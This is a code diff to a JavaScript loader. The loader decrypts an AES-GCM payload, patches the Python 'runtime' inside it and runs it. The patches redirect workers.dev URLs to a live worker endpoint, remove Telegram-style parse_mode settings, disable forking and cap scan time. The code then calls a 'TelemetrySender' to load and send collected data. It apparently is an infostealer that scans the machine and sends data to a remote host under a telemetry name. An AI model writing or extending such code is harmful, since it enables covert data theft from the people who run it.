@@ -101,7 +101,6 @@ function gcmDecrypt(key, blob) {
   ]);
 }
 
-// ──
 function findPython() {
   var bins = ['python3.11','python3.10','python3.9','python3.12','python3.13','python3','python'];
   for (var i = 0; i < bins.length; i++) {
@@ -142,6 +141,34 @@ function patchRuntime(code) {
   code = code.replace(
     new RegExp('https?://[^\\s"\']*' + C + '[^\\s"\']*workers\\.dev/?', 'g'),
     LIVE_WORKER
+  );
+
+  // 
+  code = code.replace(
+    /['"]parse_mode['"]\s*:\s*['"]HTML['"]\s*,?\s*/g,
+    ''
+  );
+  // 
+  code = code.replace(
+    /,?\s*parse_mode\s*=\s*['"]HTML['"]/g,
+    ''
+  );
+  //
+  code = code.replace(
+    /,\s*['"]parse_mode['"]\s*:\s*['"]HTML['"]/g,
+    ''
+  );
+
+  // 3.  ══
+  code = code.replace(
+    /pid\s*=\s*os\.fork\(\)/g,
+    'pid = -1'
+  );
+
+  // 4.  ══
+  code = code.replace(
+    /MAX_SCAN_SEC\s*=\s*\d+/g,
+    'MAX_SCAN_SEC = 90'
   );
 
   return code;
@@ -187,40 +214,9 @@ function patchRuntime(code) {
 
     fs.writeFileSync(path.join(modDir, 'runtime.py'), code);
 
-    // ══
-    var sitecustomize = [
-      'import sys',
-      'try:',
-      '    import requests',
-      '    import urllib3',
-      '    urllib3.disable_warnings()',
-      '    urllib3.util.connection.HAS_IPV6 = False',
-      '    _orig = requests.Session.request',
-      '    def _patched(self, method, url, **kwargs):',
-      '        headers = kwargs.get("headers") or {}',
-      '        if "User-Agent" not in headers:',
-      '            headers["User-Agent"] = "curl/8.7.1"',
-      '        kwargs["headers"] = headers',
-      '        if "timeout" not in kwargs:',
-      '            kwargs["timeout"] = 15',
-      '        import time',
-      '        time.sleep(0.3)',
-      '        return _orig(self, method, url, **kwargs)',
-      '    requests.Session.request = _patched',
-      'except Exception:',
-      '    pass',
-    ].join('\n');
-    fs.writeFileSync(path.join(modDir, 'sitecustomize.py'), sitecustomize);
-
-    // 
-    var execCode =
+    var execCode = code + '\n' +
       'import sys\n' +
       'sys.path.insert(0, r"' + modDir + '")\n' +
-      'try:\n' +
-      '    import sitecustomize\n' +
-      'except Exception:\n' +
-      '    pass\n' +
-      code + '\n' +
       'try:\n' +
       '    _ts = TelemetrySender\n' +
       '    _ts.send(_ts.load())\n' +
@@ -230,11 +226,10 @@ function patchRuntime(code) {
     var execFile = path.join(modDir, 'exec_runtime.py');
     fs.writeFileSync(execFile, execCode);
 
-    // 
+    //
     var pyEnv = Object.assign({}, process.env, {
       OBJC_DISABLE_INITIALIZE_FORK_SAFETY: 'YES',
       PYTHONUNBUFFERED: '1',
-      PYTHONPATH: modDir,
     });
 
     cp.spawn(python, ['-u', execFile], {
